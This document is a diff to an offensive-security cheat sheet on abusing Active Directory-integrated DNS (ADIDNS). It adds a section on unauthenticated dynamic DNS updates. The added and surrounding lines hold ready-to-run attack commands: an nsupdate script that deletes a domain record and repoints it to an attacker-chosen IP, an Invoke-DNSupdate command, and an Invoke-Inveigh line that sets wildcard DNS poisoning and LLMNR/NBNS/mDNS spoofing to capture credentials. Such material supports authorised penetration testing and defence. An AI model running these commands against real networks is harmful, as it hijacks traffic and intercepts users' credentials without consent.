@@ -2,6 +2,8 @@
 
 ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.
 
+## LDAP-Based (Require authentication)
+
 * Enumerate all records
 
     ```ps1
@@ -32,6 +34,32 @@ The common way to abuse ADIDNS is to set a wildcard record and then passively li
 
 ```ps1
 Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
+```
+
+## Dynamic Updates (Doesn't require authentication)
+
+Dynamic DNS (RFC 2136) allows using the DNS protocol to update DNS records:
+
+1. If the zone is set to Secure Only, you need a valid Kerberos ticket.
+
+2. If the zone is set to Nonsecure and Secure, anyone on the network can send updates.
+
+Update a record:
+
+```ps1
+# Linux
+cat << EOF > dnsupdate.txt
+server dc.domain.corp
+zone domain.corp
+update delete test.domain.corp A
+update add test.domain.corp 3600 A 10.10.10.123
+send
+EOF
+
+nsupdate dnsupdate.txt
+
+# Windows
+Invoke-DNSupdate -DNSType A -DNSName test -DNSData 192.168.125.100 -Verbose
 ```
 
 ## DNS Reconnaissance
